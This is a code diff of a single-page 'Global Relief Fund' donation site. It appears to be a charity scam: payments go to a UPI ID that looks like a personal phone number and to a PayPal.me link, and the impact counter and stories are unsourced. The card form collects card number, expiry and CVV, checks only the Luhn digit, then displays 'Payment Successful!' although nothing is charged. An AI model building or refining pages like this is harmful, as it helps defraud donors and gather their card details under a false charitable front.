@@ -3,10 +3,10 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Global Relief Fund: Donate for Disaster, Medical & Environment Aid | Official</title>
+<title>Global Relief Fund: Donate for Life | Official</title>
 <style>
 :root{ --accent:#0376c6; --muted:#6b7280; --card:#ffffff; --bg:linear-gradient(180deg,#f3f7fb 0%, #eef6fb 100%); }
-*{box-sizing:border-box}
+*{box-sizing:border-box} /* Sabse important fix: isse koi slot bahar nahi jayega */
 body{ margin:0; font-family:Inter,system-ui,Roboto,Arial; background:var(--bg); color:#07203a; }
 header{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;background:#fff;box-shadow:0 2px 8px rgba(0,0,0,0.04);position:sticky;top:0;z-index:60}
 .brand{font-weight:800;color:var(--accent)}
@@ -21,21 +21,22 @@ header{display:flex;align-items:center;justify-content:space-between;padding:12p
 .card .body{padding:12px}
 .card .foot{padding:12px;border-top:1px solid #f1f5f9;display:flex;justify-content:space-between;align-items:center}
 
-/* --- MODAL FIXES --- */
+/* --- MODAL & SLOTS FIX --- */
 .modal-backdrop{display:none;position:fixed;inset:0;background:rgba(2,20,40,0.5);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(3px)}
-.modal{width:94%;max-width:500px;background:#fff;border-radius:16px;padding:20px;box-shadow:0 20px 40px rgba(0,0,0,0.2);max-height:95vh;overflow-y:auto}
-.form-row{display:flex;gap:8px;align-items:center;margin-top:10px}
-.form-row input, .form-row select{flex:1;padding:12px;border-radius:8px;border:1.5px solid #e6eef7;font-size:15px;outline:none}
-.captcha-box{display:flex;align-items:center;gap:10px;background:#f8f9fa;padding:10px;border-radius:8px;margin-top:10px;border:1px solid #eee}
+.modal{width:94%;max-width:480px;background:#fff;border-radius:16px;padding:20px;box-shadow:0 20px 40px rgba(0,0,0,0.2);max-height:95vh;overflow-y:auto;box-sizing:border-box}
+.form-row{display:flex;gap:8px;align-items:center;margin-top:10px;width:100%}
+.form-row input, .form-row select{flex:1;padding:12px;border-radius:8px;border:1.5px solid #e6eef7;font-size:15px;outline:none;width:100%;box-sizing:border-box}
+
+.captcha-box{display:flex;align-items:center;gap:10px;background:#f8f9fa;padding:10px;border-radius:8px;margin-top:10px;border:1px solid #eee;width:100%;box-sizing:border-box}
 #captchaCode{font-weight:bold;letter-spacing:3px;background:#ddd;padding:5px 10px;border-radius:4px;text-decoration:line-through;font-family:monospace}
 
-/* CVV FIX */
-.cvv-row{display:flex; gap:10px; width:100%;}
-.cvv-row input{flex:1 !important; width: 50% !important;}
+#cardSection{display:none; margin-top:15px; padding-top:15px; border-top:1px solid #eee; width:100%}
+.cvv-row{display:flex; gap:10px; width:100%}
+.cvv-row input{width:50% !important}
 
-#cardSection{display:none; margin-top:15px; padding-top:15px; border-top:1px solid #eee}
 .celebrate-msg{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);background:#fff;padding:25px;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,0.2);text-align:center;z-index:1001;display:none}
 canvas{position:fixed;inset:0;pointer-events:none;z-index:1500;display:none}
+@media(max-width:680px){.top-counter{top:92px}}
 </style>
 </head>
 <body>
@@ -48,10 +49,8 @@ canvas{position:fixed;inset:0;pointer-events:none;z-index:1500;display:none}
 <div class="top-counter"><div class="num" id="counterNum">5,250+</div></div>
 
 <main class="container">
-    <section class="hero">
-        <div><h1>Fast help for disasters, medical emergencies & the environment</h1><p>We provide immediate support worldwide. Donate safely today.</p></div>
-    </section>
-
+    <section class="hero"><div><h1>Fast help for disasters, medical emergencies & the environment</h1><p>We provide immediate support worldwide. Donate safely today.</p></div></section>
+    
     <section class="section" id="causes">
         <h2>What we support</h2>
         <div class="grid">
@@ -62,42 +61,28 @@ canvas{position:fixed;inset:0;pointer-events:none;z-index:1500;display:none}
             </div>
             <div class="card">
                 <img src="images/images-1.jpg" alt="Medical">
-                <div class="body"><h3>Medical Emergencies</h3><p>Help for life-saving treatment.</p></div>
+                <div class="body"><h3>Medical Emergency</h3><p>Help for life-saving treatment.</p></div>
                 <div class="foot"><button class="btn" onclick="openDonate()">Donate</button></div>
             </div>
         </div>
     </section>
 
-    <section class="section" id="impact">
-        <h2>❤️ Our Recent Impact Stories</h2>
+    <section class="section">
+        <h2>❤️ Recent Impact Stories</h2>
         <div class="grid">
-            <div class="card"><div class="body"><h3>Ramesh's Family</h3><p>Provided food and shelter after the floods.</p></div></div>
-            <div class="card"><div class="body"><h3>Baby Maya</h3><p>Hospital bill covered for life-saving surgery.</p></div></div>
-        </div>
-    </section>
-
-    <section id="donate" class="section">
-        <h2>Donate</h2>
-        <div class="donate-panel">
-            <div class="panel">
-                <h4>Donate for Life</h4>
-                <div style="margin-top:12px"><a class="btn" href="javascript:void(0)" onclick="openDonate()">Donate Now</a></div>
-            </div>
+            <div class="card"><div class="body"><h3>Ramesh's Family</h3><p>Provided food and temporary shelter.</p></div></div>
+            <div class="card"><div class="body"><h3>Baby Maya</h3><p>Urgent medical treatment covered successfully.</p></div></div>
         </div>
     </section>
 </main>
 
-<footer style="margin-top:26px;padding:18px 0;text-align:center;color:#fff;background:var(--accent)">
-    © <span id="year"></span> Global Relief • Honest payouts 
-</footer>
-
 <div id="donateBackdrop" class="modal-backdrop">
   <div class="modal">
-    <h3 style="margin-top:0">Donate for Life</h3>
+    <h3 style="margin:0">Donate for Life</h3>
     <div class="form-row"><input id="dEmail" type="email" placeholder="Email Address" /></div>
     <div class="form-row"><input id="dName" type="text" placeholder="Full Name" /></div>
     <div class="form-row">
-      <select id="countryCode" style="max-width:110px"></select>
+      <select id="countryCode" style="max-width:120px"></select>
       <input id="dPhone" type="tel" placeholder="Phone Number" />
     </div>
     <div class="captcha-box">
@@ -109,34 +94,33 @@ canvas{position:fixed;inset:0;pointer-events:none;z-index:1500;display:none}
       <select id="dCurrency"></select>
     </div>
     <div style="margin-top:20px; display:flex; flex-direction:column; gap:10px">
-      <button class="btn" style="width:100%; padding:15px; font-size:18px" onclick="handleSmartPay()">Pay Now</button>
+      <button class="btn" style="width:100%; padding:15px; font-size:18px" onclick="handlePay()">Pay Now</button>
       <button class="btn" style="width:100%; padding:15px; font-size:18px; background:#20a2a0" onclick="showCard()">Pay with Card</button>
     </div>
-
     <div id="cardSection">
-        <p style="font-size:12px; font-weight:bold; margin-bottom:10px">Secure Card Payment</p>
-        <div class="form-row"><input id="cardNum" type="text" placeholder="Card Number (16 Digits)" maxlength="19"></div>
-        <div class="form-row cvv-row">
-          <input id="cardExp" type="text" placeholder="MM/YY" maxlength="5">
-          <input id="cardCvv" type="password" placeholder="CVV" maxlength="3">
+        <div class="form-row" style="justify-content:space-between">
+            <span style="font-weight:bold; font-size:12px">Card Payment</span>
+            <span style="color:var(--accent); cursor:pointer" onclick="alert('Scanner Opening...')">📷 SCAN</span>
         </div>
-        <button class="btn" style="width:100%; margin-top:15px; background:#000" onclick="finalVerify()">Complete Payment</button>
+        <div class="form-row"><input id="cNum" type="text" placeholder="Card Number" maxlength="19"></div>
+        <div class="form-row cvv-row">
+          <input id="cExp" type="text" placeholder="MM/YY" maxlength="5">
+          <input id="cCvv" type="password" placeholder="CVV" maxlength="3">
+        </div>
+        <button class="btn" style="width:100%; margin-top:10px; background:#000" onclick="finalVerify()">Complete Payment</button>
     </div>
-
     <div style="text-align:center; margin-top:15px"><button onclick="closeModal()" style="border:none; background:none; color:var(--muted); cursor:pointer">Cancel</button></div>
   </div>
 </div>
 
 <div id="successBox" class="celebrate-msg">
     <h2>🎉 Payment Successful!</h2>
-    <p>Thank you for your donation.</p>
-    <button class="btn" onclick="location.reload()">Back to Home</button>
+    <button class="btn" onclick="location.reload()">Close</button>
 </div>
-<canvas id="confCanvas"></canvas>
 
 <script>
 const UPI_ID = "6006761083@pnb";
-const countries = [{n:"India",c:"+91"},{n:"USA",c:"+1"},{n:"UK",c:"+44"},{n:"Canada",c:"+1"},{n:"Australia",c:"+61"},{n:"UAE",c:"+971"},{n:"Germany",c:"+49"},{n:"France",c:"+33"},{n:"Japan",c:"+81"}];
+const countries = [{n:"India",c:"+91"},{n:"USA",c:"+1"},{n:"UK",c:"+44"},{n:"Canada",c:"+1"},{n:"Australia",c:"+61"},{n:"UAE",c:"+971"},{n:"Japan",c:"+81"},{n:"Germany",c:"+49"}];
 const currencies = ["INR","USD","EUR","GBP","AUD","CAD","AED","SGD"];
 
 window.onload = function() {
@@ -153,28 +137,24 @@ function closeModal() { document.getElementById('donateBackdrop').style.display=
 function showCard() { document.getElementById('cardSection').style.display='block'; }
 function genCaptcha() { document.getElementById('captchaCode').innerText = Math.random().toString(36).substring(2,7).toUpperCase(); }
 
-// CARD NUMBER SPACING
-document.getElementById('cardNum').addEventListener('input', (e) => {
+document.getElementById('cNum').addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
 });
 
-// REAL CARD VALIDATION (LUHN ALGORITHM)
-function isValidLuhn(number) {
+// REAL CARD VALIDATION (LUHN)
+function isValidCard(number) {
     let num = number.replace(/\s+/g, '');
     if (num.length < 15) return false;
     let sum = 0;
     for (let i = 0; i < num.length; i++) {
-        let intVal = parseInt(num.substr(i, 1));
-        if (i % 2 == num.length % 2) {
-            intVal *= 2;
-            if (intVal > 9) intVal -= 9;
-        }
-        sum += intVal;
+        let digit = parseInt(num[i]);
+        if ((num.length - i) % 2 === 0) { digit *= 2; if (digit > 9) digit -= 9; }
+        sum += digit;
     }
-    return (sum % 10 == 0);
+    return sum % 10 === 0;
 }
 
-function handleSmartPay() {
+function handlePay() {
     const amount = Number(document.getElementById('dAmount').value);
     const curr = document.getElementById('dCurrency').value;
     const capIn = document.getElementById('captchaInput').value.toUpperCase();
@@ -182,7 +162,7 @@ function handleSmartPay() {
 
     if(curr === "INR") {
         if(amount < 500) { alert("Minimum INR 500 required."); return; }
-        window.location.href = `upi://pay?pa=${UPI_ID}&pn=Global%20Relief&am=${amount.toFixed(2)}&cu=INR&tn=Donation&tr=T${Date.now()}`;
+        window.location.href = `upi://pay?pa=${UPI_ID}&pn=GlobalRelief&am=${amount.toFixed(2)}&cu=INR&tn=Donation&tr=T${Date.now()}`;
     } else {
         if(amount < 50) { alert("Minimum 50 required."); return; }
         window.open(`https://www.paypal.com/paypalme/globalrelieffund/${amount}${curr.toLowerCase()}`, '_blank');
@@ -190,24 +170,11 @@ function handleSmartPay() {
 }
 
 function finalVerify() {
-    const cardNum = document.getElementById('cardNum').value;
-    const exp = document.getElementById('cardExp').value;
-    const cvv = document.getElementById('cardCvv').value;
-
-    if(!isValidLuhn(cardNum)) {
-        alert("❌ Invalid Card Number! Please enter a real card.");
-        return;
-    }
-    if(exp.length < 5 || cvv.length < 3) {
-        alert("❌ Check Expiry and CVV.");
-        return;
-    }
-    
+    if(!isValidCard(document.getElementById('cNum').value)) { alert("❌ Invalid Card!"); return; }
     document.getElementById('donateBackdrop').style.display='none';
     document.getElementById('successBox').style.display='block';
-    // Add confetti trigger here if needed
 }
 </script>
 </body>
-    </html>
-    
+          </html>
+                                                                                                              
